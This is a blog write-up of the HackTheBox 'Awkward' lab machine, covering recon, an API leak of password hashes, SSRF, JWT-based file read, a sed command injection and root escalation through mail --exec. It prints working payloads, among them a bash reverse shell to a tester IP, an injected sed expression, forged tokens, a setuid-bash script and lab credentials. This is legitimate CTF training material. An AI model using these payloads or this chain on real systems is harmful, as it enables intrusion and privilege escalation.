---
layout: post
title:  "HTB - Awkward Writeup"
date:   2023-11-30 16:45:01 -0500
categories: Writeups
---

# HackTheBox - Awkward Writeup

**Medium Linux**

I did the box a long time again, and am only now transforming my notes into a more proper writeup, so please forgive any sloppiness.

Please also note that the target IP changes a couple times, as I had to revert the machine once due to technical difficulties, and later had to come back to it after a break.

## Recon and Initial Access 

First, I performed some basic `nmap` scans. Using `sudo nmap -sC -sV -Pn 10.129.228.81`, I found SSH and a web server:

![image](/assets/images/awkward/awkward1.png)

Running an initial `curl`, I found a domain `hat-valley.htb`:

![image](/assets/images/awkward/awkward2.png)

Having added this to our hosts, I proceeded to examine the website:

![image](/assets/images/awkward/awkward3.png)

I also decided to fuzz for content, and subdomains and vhosts, finding `store.hat-valley.htb` as well. Browsing to this, I was presented with an HTTP authentication prompt, and put it aside for the time being.

![image](/assets/images/awkward/awkward4.png)

Browsing through the homepage source, I found a reference to a JavaScript file `app.js`. Both the name and the fact this was nonstandard caught my eye. Indeed, I found application source code:

![image](/assets/images/awkward/awkward5.png)

Manually skimming through this gave me a sense of the format, and I able to find some routes, made easier by the following admittedly ugly command:

```
curl -s http://hat-valley.htb/js.app.js | grep routes | sed 's/path:/\n/g' | grep '\ \\*\/' | awk '{print $2}' FS='"' | tr -d \\
```
&nbsp;

![image](/assets/images/awkward/awkward6.png)


```
/
/hr
/dashboard
/leave
```
&nbsp;

First, I examined `/hr` and found a login page, but was unable to do anything with it immediately. I opted to shelve the rest for the time being in order to ensure I had comprehensively analyzed `app.js`, and I found API endpoints. Once again, knowing the format, I used an ugly command to parse out all the API endpoints referenced in the file:

```
curl -s http://hat-valley.htb/js/app.js | sed 's/baseURL + /\n/g' | grep "return response" | awk '{print $2}' FS="'"
```
&nbsp;


![image](/assets/images/awkward/awkward7.png)

```
all-leave
submit-leave
login
staff-details
store-status
```
&nbsp;
&nbsp;

It appeared that one could:

1. Manage "leaves" 
2. Log in 
3. Examine staff and 
4. Interact with the store 
&nbsp;
&nbsp;

via the API. I immediately tested `staff-details` as it might have contained credentials. Lo and behold, I was able to get a variety of user details, including usernames, SHA256-hashed passwords, real names, company roles, and phone numbers.

![image](/assets/images/awkward/awkward8.png)

I decided to attempt to crack the hashes using `john` in the interest of time, as hashcat was being temperamental about the format, and this is just a CTF after all. I was unsuccessful for most users, but successfully cracked `christopher.jones`'s password:

![image](/assets/images/awkward/awkward9.png)

```
Username: christopher.jones
Password: chris123
```


This did not allow me to simply SSH in, but I was able to log in to the HR portal I found earlier:

![image](/assets/images/awkward/awkward10.png)

Playing around with the functionality while capturing requests with Burp, I found a JWT when using the status refresh functionality.

![image](/assets/images/awkward/awkward11.png)

I was able to successfully crack this (and this time, hashcat was cooperating - I suspect I had just been fatigued when formatting the sha256 hash earlier):

![image](/assets/images/awkward/awkward12.png)

```
123beany123
```


This was likely a password, given both the format and the purpose of the JWT in the request. Having unsuccessfully attempted small manual password sprays for both the HR portal and SSH (i.e., all known usernames with this password), I then decided to see if this token could be used to interact with the API. First, I tested `store-status` and noticed that I could make localhost port 80 the value of the `url` parameter and successfully request the homepage, indicating a Server-Side Request Forgery (SSRF) vulnerability:

![image](/assets/images/awkward/awkward13.png)

Given the SSRF, I decided to see if there were any resources I could only access "internally" by abusing it. Beginning by fuzzing port numbers (initially, 0-9999) I found two previously-unknown ports.

```
ffuf -w /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt -u 'http://hat-valley.htb/api/store-status?url="http//127.0.0.1:FUZZ"' -fs 0
```
&nbsp;


![image](/assets/images/awkward/awkward14.png)

```
3002
8080
```


First, I examined 3002, rendering in Burp, and discovered the internal API documentation.

![image](/assets/images/awkward/awkward15.png)

The `login` endpoint requires a username and password. Given that I had a token, I decided to see if any of the endpoints allowed me to use only a token, and discovered that `all-leave` does. Furthermore there was a vulnerable `exec()` in the method that didn't correctly sanitize user input, allowing arbitrary file read via `user`

![image](/assets/images/awkward/awkward16.png)

At this time, I hadn't set all my Burp plugins back up, so decided to create the payload using the `jwt.io` web service, successfully reading `/etc/passwd`

![image](/assets/images/awkward/awkward17.png)
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ldGMvcGFzc3dkICciLCJpYXQiOjE1MTYyMzkwMjJ9.P8Xa-exYSL2gWWnTE2I2pZsesofPuzQaPrvjvj3uzpU
```
&nbsp;


![image](/assets/images/awkward/awkward18.png)

Going through the list, I found more regular users other than root:

![image](/assets/images/awkward/awkward19.png)

```
bean
christine
```

At this point, although I was skeptical I decided to see if I could simply read the `user.txt`, taking the educated guess that it was either in `bean` or `christine`'s home directory. Unsurprisingly, this didn't work. I therefore decided to use the `123beany123` password to SSH into these two users, but was unsuccessful. Given the password, it was therefore safe to assume for the time being that this was only `bean`'s API/HR password. However, in the process of using the file read to enumerate the users' home directories, I discovered a gzip backup of some sort in `bean`'s homedir, and successfully attempted to download it with `curl` using the JWT I crafted:

```
curl http://hat-valley.htb/api/all-leave --header "Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vRG9jdW1lbnRzL2JhY2t1cC9iZWFuX2JhY2t1cF9maW5hbC50YXIuZ3ogJyIsImlhdCI6MTUxNjIzOTAyMn0.y7_OwRtuzV8lCTwYe1Ac1t2nG50wjK38MeajRYAKAuM" --output bean_backup_final.tar.gz
```


![image](/assets/images/awkward/awkward20.png)

## bean's backup and the user flag


The backup I downloaded earlier appears to be a full backup of `bean`'s home directory from an earlier time:

![image](/assets/images/awkward/awkward21.png)

I decided to hunt for credentials. While `bean` had the good sense to not leave SSH keys in the backup, I found a plaintext password in an `xpad` config file.

![image](/assets/images/awkward/awkward22.png)

```
014mrbeanrules!#P
```
&nbsp;


Finally, I was able to successfully SSH into the server as `bean` and obtain the `user.txt`

![image](/assets/images/awkward/awkward23.png)

![image](/assets/images/awkward/awkward24.png)

## Privilege escalation
&nbsp;


Some of the most basic privilege escalation vectors, such as sudo misconfigurations or dangerous suid binaries, didn't work. Using pspy64 to examine processes, however, I found some interesting commands running as root:

![image](/assets/images/awkward/awkward25.png)

![image](/assets/images/awkward/awkward26.png)


`inotifywait` was running as root and monitoring for a modification of a file `leave_requests.csv`. `mail` was also running periodically as root to process the leave requests. `mail` [has an](https://gtfobins.github.io/gtfobins/mail/) `--exec` flag like an alarming number of utilities. There was nothing stopping me from simply adding it to the `leave_requests` CSV such that when `mail` processed it, it would execute a file of my choice as root. I couldn't read or write to `/var/www/private` as `bean`, but it must've been possible to do so as the webserver. Therefore, the course of action was to find some way to get a shell as the webserver.

I recalled the HTTP authentication I encountered earlier for `store.hat-valley.htb` and decided to see if now that I was on the server proper, I could find any credentials and try them there. HTTP authentication passwords are stored in `.htpasswd`, which is typically stored in the webserver's config directory. I found a user `admin`:

![image](/assets/images/awkward/awkward27.png)

While (unsuccessfully) attempting to crack the hash in the background, I tested for password reuse on the part of `bean` and successfully authenticated as `admin` using the same password as SSH:

```
Username: admin
Password: 014mrbeanrules!#P
```
&nbsp;

![image](/assets/images/awkward/awkward28.png)
Since I had a shell on the webserver, I decided to see if I could read the server-side files for the store on top of the client-side source, and I could. 

![image](/assets/images/awkward/awkward29.png)

First I examined the README, which contained several useful pieces of information about how the store application works.

![image](/assets/images/awkward/awkward30.png)

Given this description, it seemed that the `cart_actions.php` source might be interesting. I found that, in line with what the README said, there was no actual database yet, and simple offline files were being used to delete items in the cart via `system()` and `sed`:

![image](/assets/images/awkward/awkward31.png)

Furthermore, we can see an attempt to filter out bad characters to prevent hacking. Unfortunately, this sanitization was improperly implemented given that `system()` is being used with `sed`, as I could use `sed -e` (expression) to put a script as the `item_id`, with the filename being the assigned `user_id`, which would be executed as the webserver. This was exactly what I wanted, as it could give me a shell as the webserver to achieve the privesc vector via `mail --exec` discussed earlier. I used a simple, small TCP reverse shell as the script, which I called `hewwo.sh` and placed in `/tmp`:

```
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.27/4444 0>&1
```

then set up a listener.

The attack would work as follows:

1. Add an item to the cart
2. Use the filename of the item server-side as my `user_id`
3. Using the valid `item_id` from above, modify it to use my script
4. `system()` will then execute `sed -e`, in turn executing my script
&nbsp;

First, I obtained the format of a valid item by adding one to the cart.

![image](/assets/images/awkward/awkward32.png)

At this stage I realized that while I can read the cart and write files to the cart directory, I couldn't directly edit the item file. However, I could replace the original item file, giving my malicious item file the same name (having renamed the original).

Given the way the `item_id` is parsed with `sed`, I needed to add the following to the `item_id`:

```
' e "1e /tmp/hewwo.sh" /tmp/hewwo.sh '
```

The final malicious item file therefore looked like this:

![image](/assets/images/awkward/awkward33.png)

Then, I deleted the item from the cart, changing the `item` parameter in the POST request to match, and obtained a shell:

![image](/assets/images/awkward/awkward34.png)

![image](/assets/images/awkward/awkward35.png)

![image](/assets/images/awkward/awkward36.png)

As discussed earlier, I now had a very simple method to privesc to root via `mail --exec` by adding an entry to `leave_requests.csv`. For reliability, I decided to use my malicious script to make bash suid, calling this script `uwu.sh`:

```
#!/bin/bash
chmod +s /bin/bash
```
&nbsp;

which as before I put in `/tmp`. Note that I had come back after a break at this point and needed to start the machine again, hence the changed IP addresses in what follows. 

I then added the malicious leave request as the webserver:


```
echo '" --exec="\!/tmp/uwu.sh"' >> leave_requests.csv
```
&nbsp;

Back in the shell as `bean`, I successfully obtained root.

![image](/assets/images/awkward/awkward37.png)








